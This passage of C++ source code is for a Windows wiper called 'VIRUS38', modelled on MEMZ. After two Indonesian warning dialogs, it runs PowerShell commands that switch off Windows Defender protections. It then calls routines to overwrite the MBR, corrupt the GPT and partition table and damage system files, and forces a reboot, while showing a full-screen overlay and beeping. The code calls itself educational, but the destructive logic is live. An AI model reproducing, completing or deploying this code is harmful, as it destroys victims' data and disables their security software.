    ExecuteCommand("powershell -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"");
    ExecuteCommand("powershell -command \"Set-MpPreference -DisableBehaviorMonitoring $true\"");
    ExecuteCommand("powershell -command \"Set-MpPreference -DisableBlockAtFirstSeen $true\"");
    ExecuteCommand("powershell -command \"Set-MpPreference -DisableIOAVProtection $true\"");
    ExecuteCommand("powershell -command \"Set-MpPreference -DisablePrivacyMode $true\"");
    ExecuteCommand("powershell -command \"Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true\"");
    ExecuteCommand("powershell -command \"Set-MpPreference -DisableScanningNetworkFiles $true\"");
    ExecuteCommand("powershell -command \"Set-MpPreference -DisableScriptScanning $true\"");
}

void ShutdownSystem() {
    ExecuteCommand("shutdown /r /f /t 0");
    CorruptSystemFiles();
    DisableWindowsDefender();
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
    GdiplusStartupInput gdiplusStartupInput;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    if (MessageBoxW(NULL, 
        L"VIRUS38 - PERINGATAN!\n\n"
        L"Program ini adalah program berbahaya yang dapat merusak sistem komputer Anda.\n"
        L"Jangan jalankan program ini kecuali Anda tahu apa yang Anda lakukan.\n\n"
        L"Program ini akan:\n"
        L"- Merusak MBR/GPT dan boot sector\n"
        L"- Menyebabkan kerusakan visual parah\n"
        L"- Merusak file sistem\n"
        L"- Menonaktifkan Windows Defender\n\n"
        L"Lanjutkan hanya jika Anda menyadari risikonya!",
        L"VIRUS38 - WARNING", 
        MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) != IDYES)
    {
        GdiplusShutdown(gdiplusToken);
        return 0;
    }

    if (MessageBoxW(NULL, 
        L"PERINGATAN TERAKHIR!\n\n"
        L"Program ini akan menyebabkan kerusakan permanen pada sistem Anda.\n"
        L"Data Anda mungkin tidak dapat dipulihkan setelah program ini dijalankan.\n\n"
        L"Program ini dibuat untuk tujuan edukasi dan penelitian saja.\n"
        L"JANGAN jalankan pada komputer yang digunakan untuk pekerjaan atau data penting.\n\n"
        L"Apakah Anda BENAR-BENAR yakin ingin melanjutkan?",
        L"VIRUS38 - FINAL WARNING", 
        MB_YESNO | MB_ICONERROR | MB_DEFBUTTON2) != IDYES)
    {
        GdiplusShutdown(gdiplusToken);
        return 0;
    }

    srand(static_cast<unsigned>(time(NULL)));
    startTime = GetTickCount();
    
    FreeConsole();
    
    std::thread([]() {
        Sleep(10000);
        
        OverwriteMBR();
        CorruptGPT();
        DestroyPartitionTable();
        
        CreateBootMessage();
        
        Sleep(20000);
        
        CorruptSystemFiles();
        ShutdownSystem();
    }).detach();
    
    WNDCLASSEXW wc = {
        sizeof(WNDCLASSEX), 
        CS_HREDRAW | CS_VREDRAW, 
        WndProc,
        0, 0, hInst, NULL, NULL, NULL, NULL,
        L"MEMZ_SIMULATION", NULL
    };
    RegisterClassExW(&wc);
    
    HWND hwnd = CreateWindowExW(
        WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        wc.lpszClassName, 
        L"MEMZ Simulation - Educational Purpose Only",
        WS_POPUP, 
        0, 0, 
        GetSystemMetrics(SM_CXSCREEN), 
        GetSystemMetrics(SM_CYSCREEN), 
        NULL, NULL, hInst, NULL
    );
    
    SetWindowPos(
        hwnd, HWND_TOPMOST, 0, 0, 
        GetSystemMetrics(SM_CXSCREEN), 
        GetSystemMetrics(SM_CYSCREEN), 
        SWP_SHOWWINDOW
    );
    
    ShowWindow(hwnd, SW_SHOW);
    
    std::thread([]() {
        for (int i = 0; i < 20; i++) {
            Beep(200, 100);
            Beep(700, 100);
            Beep(1200, 100);
            Sleep(5);
        }
        
        for (int i = 0; i < 150; i++) {
            Beep(rand() % 8000 + 300, 10);
            Sleep(1);
        }
        
        for (int i = 0; i < 15; i++) {
            Beep(30 + i * 250, 250);
        }
    }).detach();
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    GdiplusShutdown(gdiplusToken);
    return static_cast<int>(msg.wParam);
}
